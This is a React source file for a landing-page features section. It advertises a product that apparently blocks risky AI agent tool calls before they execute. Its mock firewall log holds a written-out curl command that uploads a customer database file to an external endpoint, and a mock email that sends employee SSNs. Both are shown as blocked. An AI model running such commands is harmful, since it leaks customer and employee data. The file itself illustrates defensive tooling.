'use client'

import { useCallback, useEffect, useId, useRef, useState } from 'react'
import clsx from 'clsx'

import { Container } from '@/components/Container'
import { ScrollReveal } from '@/components/ScrollReveal'

const features = [
  {
    name: 'Cross-agent trace history',
    summary: 'One timeline across every agent and provider.',
    description:
      'Replay sessions that span multiple agents and tools in a single view. Not locked to one framework like LangSmith.',
    preview: 'trace-chain',
    icon: function ReportingIcon() {
      let id = useId()
      return (
        <>
          <defs>
            <linearGradient
              id={id}
              x1="11.5"
              y1={18}
              x2={36}
              y2="15.5"
              gradientUnits="userSpaceOnUse"
            >
              <stop offset=".194" stopColor="#fff" />
              <stop offset={1} stopColor="#F97316" />
            </linearGradient>
          </defs>
          <path
            d="m30 15-4 5-4-11-4 18-4-11-4 7-4-5"
            stroke={`url(#${id})`}
            strokeWidth={2}
            strokeLinecap="round"
            strokeLinejoin="round"
          />
        </>
      )
    },
  },
  {
    name: 'Pre-execution blocking',
    summary: 'Stop risky actions before they happen.',
    description:
      'Mayple intercepts tool calls before execution — not after. Observability tools alert you post-fact. We prevent the damage.',
    preview: 'blocking',
    icon: function InventoryIcon() {
      return (
        <>
          <path
            opacity=".5"
            d="M8 17a1 1 0 0 1 1-1h18a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2Z"
            fill="#fff"
          />
          <path
            opacity=".3"
            d="M8 24a1 1 0 0 1 1-1h18a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2Z"
            fill="#fff"
          />
          <path
            d="M8 10a1 1 0 0 1 1-1h18a1 1 0 0 1 1 1v2a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2Z"
            fill="#fff"
          />
        </>
      )
    },
  },
  {
    name: 'No-code policy rules',
    summary: 'Your ops team writes the rules, not engineering.',
    description:
      'Set per-user allow, block, and approval policies without code. Granular enough for compliance, simple enough for non-technical teams.',
    preview: 'policy',
    icon: function ContactsIcon() {
      return (
        <>
          <path
            opacity=".5"
            d="M25.778 25.778c.39.39 1.027.393 1.384-.028A11.952 11.952 0 0 0 30 18c0-6.627-5.373-12-12-12S6 11.373 6 18c0 2.954 1.067 5.659 2.838 7.75.357.421.993.419 1.384.028.39-.39.386-1.02.036-1.448A9.959 9.959 0 0 1 8 18c0-5.523 4.477-10 10-10s10 4.477 10 10a9.959 9.959 0 0 1-2.258 6.33c-.35.427-.354 1.058.036 1.448Z"
            fill="#fff"
          />
          <path
            d="M12 28.395V28a6 6 0 0 1 12 0v.395A11.945 11.945 0 0 1 18 30c-2.186 0-4.235-.584-6-1.605ZM21 16.5c0-1.933-.5-3.5-3-3.5s-3 1.567-3 3.5 1.343 3.5 3 3.5 3-1.567 3-3.5Z"
            fill="#fff"
          />
        </>
      )
    },
  },
]

const traceSteps = [
  {
    id: '01',
    actor: 'router-agent',
    action: 'Received request and opened session maple-live-42.',
    type: 'plan',
    risk: 'low',
  },
  {
    id: '02',
    actor: 'finance-agent',
    action: 'Called billing.getInvoice for INV-1042.',
    type: 'tool',
    risk: 'low',
  },
  {
    id: '03',
    actor: 'ops-agent',
    action: 'Tried shell command: curl external endpoint.',
    type: 'command',
    risk: 'high',
  },
  {
    id: '04',
    actor: 'policy-engine',
    action: 'Blocked action and sent approval request to reviewer.',
    type: 'guard',
    risk: 'medium',
  },
]

const riskToneClasses = {
  low: 'bg-emerald-400/20 text-emerald-100 ring-1 ring-emerald-300/25',
  medium: 'bg-amber-400/20 text-amber-100 ring-1 ring-amber-300/25',
  high: 'bg-rose-400/20 text-rose-100 ring-1 ring-rose-300/25',
}

function Feature({ feature, isActive, className, ...props }) {
  return (
    <div
      className={clsx(
        'group/feature rounded-xl p-5 transition-all duration-200',
        className,
        isActive
          ? 'bg-orange-50 ring-1 ring-orange-200'
          : 'hover:bg-zinc-50',
      )}
      {...props}
    >
      <div
        className={clsx(
          'w-10 rounded-lg p-0.5 transition-colors duration-200',
          isActive
            ? 'bg-orange-600'
            : 'bg-zinc-400 group-hover/feature:bg-orange-500',
        )}
      >
        <svg aria-hidden="true" className="h-9 w-9" fill="none">
          <feature.icon />
        </svg>
      </div>
      <h3
        className={clsx(
          'mt-4 text-base font-semibold transition-colors duration-200',
          isActive
            ? 'text-orange-600'
            : 'text-zinc-900 group-hover/feature:text-orange-600',
        )}
      >
        {feature.name}
      </h3>
      <p className="mt-1 font-display text-lg text-zinc-900">
        {feature.summary}
      </p>
      <p className="mt-3 text-sm leading-relaxed text-zinc-500">{feature.description}</p>
    </div>
  )
}

function TraceChainPreview() {
  return (
    <div className="mx-auto w-full max-w-[52.75rem] overflow-hidden rounded-xl bg-zinc-800 shadow-lg ring-1 shadow-zinc-900/5 ring-zinc-500/10">
      <div className="border-b border-zinc-700/70 bg-zinc-900/60 px-6 py-4">
        <p className="text-xs font-medium tracking-wide text-zinc-300 uppercase">
          Trace Session
        </p>
        <div className="mt-2 flex items-center justify-between gap-4">
          <p className="font-display text-lg text-white">maple-live-42</p>
          <span className="rounded-full bg-zinc-700 px-3 py-1 text-xs text-zinc-200">
            4 actions tracked
          </span>
        </div>
      </div>
      <ol className="space-y-4 px-6 py-6">
        {traceSteps.map((step, index) => (
          <li key={step.id} className="relative pl-10">
            {index !== traceSteps.length - 1 ? (
              <span className="absolute top-8 left-4 h-[calc(100%+0.75rem)] w-px bg-zinc-600/70" />
            ) : null}
            <span className="absolute top-1 left-0 inline-flex h-8 w-8 items-center justify-center rounded-md bg-zinc-700 text-xs font-semibold text-zinc-100">
              {step.id}
            </span>
            <div className="rounded-lg border border-zinc-600/80 bg-zinc-800/80 p-3">
              <div className="flex flex-wrap items-center gap-2">
                <span className="rounded-full bg-zinc-700 px-2 py-0.5 text-[11px] text-zinc-100">
                  {step.type}
                </span>
                <span className="rounded-full bg-zinc-700 px-2 py-0.5 text-[11px] text-zinc-100">
                  {step.actor}
                </span>
                <span
                  className={clsx(
                    'rounded-full px-2 py-0.5 text-[11px]',
                    riskToneClasses[step.risk],
                  )}
                >
                  risk {step.risk}
                </span>
              </div>
              <p className="mt-2 text-sm text-zinc-200">{step.action}</p>
            </div>
          </li>
        ))}
      </ol>
    </div>
  )
}

function BlockingPreview() {
  const events = [
    {
      agent: 'ops-agent',
      tool: 'shell.exec',
      payload: 'curl -X POST https://ext.api/upload -d @customer_db.csv',
      verdict: 'blocked',
      reason: 'Outbound data transfer blocked by policy "no-external-upload"',
      latency: '< 2 ms',
    },
    {
      agent: 'finance-agent',
      tool: 'slack.postMessage',
      payload: '#general: Here is the invoice summary for Q2.',
      verdict: 'allowed',
      reason: null,
      latency: '< 1 ms',
    },
    {
      agent: 'hr-agent',
      tool: 'email.send',
      payload: 'to: all@company.com — Employee SSNs attached',
      verdict: 'blocked',
      reason: 'PII detected in attachment — blocked by "pii-guard" policy',
      latency: '< 1 ms',
    },
  ]

  return (
    <div className="mx-auto w-full max-w-[52.75rem] overflow-hidden rounded-xl bg-zinc-800 shadow-lg ring-1 shadow-zinc-900/5 ring-zinc-500/10">
      <div className="border-b border-zinc-700/70 bg-zinc-900/60 px-6 py-4">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-xs font-medium tracking-wide text-zinc-300 uppercase">
              Firewall Intercept Log
            </p>
            <p className="mt-1 text-[11px] text-zinc-500">
              Real-time tool-call decisions
            </p>
          </div>
          <span className="flex items-center gap-1.5 text-[11px] text-emerald-400">
            <span className="h-1.5 w-1.5 animate-pulse rounded-full bg-emerald-400" />
            Live
          </span>
        </div>
      </div>

      <div className="divide-y divide-zinc-700/50 px-6">
        {events.map((evt, i) => (
          <div key={i} className="py-4">
            <div className="mb-2 flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="rounded-full bg-zinc-700 px-2 py-0.5 text-[11px] text-zinc-200">
                  {evt.agent}
                </span>
                <span className="text-[11px] text-zinc-500">{evt.tool}</span>
              </div>
              <div className="flex items-center gap-2">
                <span className="text-[10px] text-zinc-600">{evt.latency}</span>
                <span
                  className={clsx(
                    'rounded-full px-2 py-0.5 text-[11px] font-medium',
                    evt.verdict === 'blocked'
                      ? 'bg-rose-500/20 text-rose-300 ring-1 ring-rose-400/20'
                      : 'bg-emerald-500/20 text-emerald-300 ring-1 ring-emerald-400/20',
                  )}
                >
                  {evt.verdict}
                </span>
              </div>
            </div>
            <p className="mb-1 rounded-md bg-zinc-900/50 px-3 py-1.5 font-mono text-[11px] text-zinc-300">
              {evt.payload}
            </p>
            {evt.reason && (
              <p className="mt-1 text-[11px] text-rose-300/80">
                {evt.reason}
              </p>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}

function PolicyPreview() {
  const policies = [
    {
      name: 'pii-guard',
      rule: 'Block any tool call that sends SSN, credit card, or passport numbers to external endpoints.',
      scope: 'All agents',
      type: 'block',
    },
    {
      name: 'slack-approval',
      rule: 'Require human approval before posting to #general or #engineering channels.',
      scope: 'Sales Outreach, HR Bot',
      type: 'approve',
    },
    {
      name: 'read-only-prod',
      rule: 'Allow database reads. Block all write, update, and delete operations on production tables.',
      scope: 'Expense Auditor',
      type: 'allow',
    },
  ]

  const typeStyles = {
    block: 'bg-rose-500/20 text-rose-300',
    approve: 'bg-amber-500/20 text-amber-300',
    allow: 'bg-emerald-500/20 text-emerald-300',
  }

  return (
    <div className="mx-auto w-full max-w-[52.75rem] overflow-hidden rounded-xl bg-zinc-800 shadow-lg ring-1 shadow-zinc-900/5 ring-zinc-500/10">
      <div className="border-b border-zinc-700/70 bg-zinc-900/60 px-6 py-4">
        <div className="flex items-center justify-between">
          <div>
            <p className="text-xs font-medium tracking-wide text-zinc-300 uppercase">
              Policy Library
            </p>
            <p className="mt-1 text-[11px] text-zinc-500">
              3 active policies &middot; written in plain language
            </p>
          </div>
          <span className="rounded-lg bg-orange-600/80 px-3 py-1.5 text-[11px] font-medium text-white">
            + New Policy
          </span>
        </div>
      </div>

      <div className="divide-y divide-zinc-700/50 px-6">
        {policies.map((policy) => (
          <div key={policy.name} className="py-4">
            <div className="mb-2 flex items-center gap-2">
              <span className="font-mono text-sm font-medium text-white">
                {policy.name}
              </span>
              <span
                className={clsx(
                  'rounded-full px-2 py-0.5 text-[10px] font-medium',
                  typeStyles[policy.type],
                )}
              >
                {policy.type}
              </span>
            </div>
            <p className="mb-2 text-[12px] leading-relaxed text-zinc-300">
              &ldquo;{policy.rule}&rdquo;
            </p>
            <div className="flex items-center gap-1.5 text-[10px] text-zinc-500">
              <svg className="h-3 w-3" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.501 20.118a7.5 7.5 0 0 1 14.998 0" />
              </svg>
              <span>Scope: {policy.scope}</span>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

function FeaturePreview({ feature }) {
  if (feature.preview === 'trace-chain') return <TraceChainPreview />
  if (feature.preview === 'blocking') return <BlockingPreview />
  if (feature.preview === 'policy') return <PolicyPreview />

  return (
    <div className="mx-auto w-full max-w-[52.75rem] overflow-hidden rounded-xl bg-zinc-800 shadow-lg ring-1 shadow-zinc-900/5 ring-zinc-500/10">
      <div className="flex flex-col items-center justify-center p-12 text-center">
        <h4 className="font-display text-xl text-white">{feature.name}</h4>
        <p className="mt-4 max-w-md text-sm text-zinc-300">
          {feature.description}
        </p>
      </div>
    </div>
  )
}

function FeaturesMobile() {
  return (
    <div className="-mx-4 mt-20 flex flex-col gap-y-10 overflow-hidden px-4 sm:-mx-6 sm:px-6 lg:hidden">
      {features.map((feature) => (
        <div key={feature.summary}>
          <Feature feature={feature} className="mx-auto max-w-2xl" isActive />
          <div className="relative mt-10 pb-10">
            <div className="absolute -inset-x-4 top-8 bottom-0 bg-zinc-200 sm:-inset-x-6" />
            <div className="relative">
              <FeaturePreview feature={feature} />
            </div>
          </div>
        </div>
      ))}
    </div>
  )
}

const ROTATE_INTERVAL = 5000

function FeaturesDesktop() {
  const [active, setActive] = useState(0)
  const [paused, setPaused] = useState(false)
  const [progress, setProgress] = useState(0)
  const startRef = useRef(Date.now())
  const rafRef = useRef(null)

  const advance = useCallback(() => {
    setActive((prev) => (prev + 1) % features.length)
    setProgress(0)
    startRef.current = Date.now()
  }, [])

  // Progress tick — runs continuously, respects pause
  useEffect(() => {
    let frameId
    function tick() {
      if (!paused) {
        const elapsed = Date.now() - startRef.current
        const pct = Math.min(elapsed / ROTATE_INTERVAL, 1)
        setProgress(pct)
        if (pct >= 1) {
          advance()
        }
      }
      frameId = requestAnimationFrame(tick)
    }
    frameId = requestAnimationFrame(tick)
    return () => cancelAnimationFrame(frameId)
  }, [paused, advance])

  function handleHover(i) {
    setPaused(true)
    setActive(i)
    setProgress(0)
  }

  function handleLeave() {
    setPaused(false)
    startRef.current = Date.now()
    setProgress(0)
  }

  return (
    <div
      className="hidden lg:mt-16 lg:block"
      onMouseLeave={handleLeave}
    >
      {/* Preview panel — top */}
      <div className="relative overflow-hidden rounded-2xl">
        <div className="flex">
          {features.map((feature, i) => (
            <div
              key={feature.summary}
              className={clsx(
                'w-full shrink-0 transition duration-500 ease-in-out',
                i !== active && 'opacity-0',
              )}
              style={{ transform: `translateX(-${active * 100}%)` }}
              aria-hidden={i !== active}
            >
              <FeaturePreview feature={feature} />
            </div>
          ))}
        </div>
      </div>

      {/* Feature tabs — bottom */}
      <div className="mt-10 grid grid-cols-3 gap-x-6">
        {features.map((feature, i) => (
          <div key={feature.summary} className="relative">
            <Feature
              feature={feature}
              isActive={i === active}
              className="cursor-pointer"
              onMouseEnter={() => handleHover(i)}
              onClick={() => handleHover(i)}
            />
            {/* Progress bar */}
            <div className="absolute right-5 bottom-0 left-5 h-0.5 overflow-hidden rounded-full bg-zinc-200">
              <div
                className="h-full rounded-full bg-orange-500 transition-none"
                style={{
                  width: i === active ? `${progress * 100}%` : '0%',
                }}
              />
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}

export function SecondaryFeatures() {
  return (
    <section
      id="secondary-features"
      aria-label="Features for running AI agents safely"
      className="pt-20 pb-20 sm:pt-32 sm:pb-32"
    >
      <Container>
        <ScrollReveal>
          <div className="mx-auto max-w-2xl md:text-center">
            <h2 className="font-display text-3xl tracking-tight text-zinc-900 sm:text-4xl">
              Security that works across your entire agent stack.
            </h2>
            <p className="mt-4 text-lg tracking-tight text-zinc-700">
              Cross-agent visibility, pre-execution blocking, and no-code
              policies — the three things no other platform gives you together.
            </p>
          </div>
        </ScrollReveal>
        <FeaturesMobile />
        <FeaturesDesktop />
      </Container>
    </section>
  )
}
